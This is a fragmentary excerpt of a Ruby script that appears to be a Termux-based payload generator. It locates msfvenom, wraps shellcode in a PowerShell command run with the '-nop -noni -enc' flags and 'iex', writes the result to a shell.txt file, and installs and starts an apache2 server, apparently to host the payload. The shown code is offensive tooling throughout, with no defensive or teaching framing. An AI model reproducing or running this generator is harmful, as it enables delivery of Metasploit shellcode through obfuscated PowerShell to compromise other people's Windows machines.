...
def powershell_string(shellcode)
  ...
  s << %("\syswow64\WindowsPowerShell\v1.0\powershell";$cmd = "-nop -noni ) s << %(-enc";iex "& $x86 $cmd $gq"}else{$cmd = "-nop -noni -enc";iex "& ) s << %(powershell $cmd $gq";}) end
...
def shell_setup(encoded_command)
  ...
  File.open('/data/data/com.termux/files/home/shell.txt', 'w') do |f|
...
def metasploit_setup(msf_path, host, port)
  ...
  system("pkg install apache2 -y && apachectl start")
...
begin
  ...
  if File.exist?('/data/data/com.termux/files/usr/bin/msfvenom')

    msf_path = '/data/data/com.termux/files/usr/bin/'

  elsif File.exist?('/data/data/com.termux/files/home/metasploit-framework/msfvenom')

    msf_path = '/data/data/com.termux/files/home/metasploit-framework/'
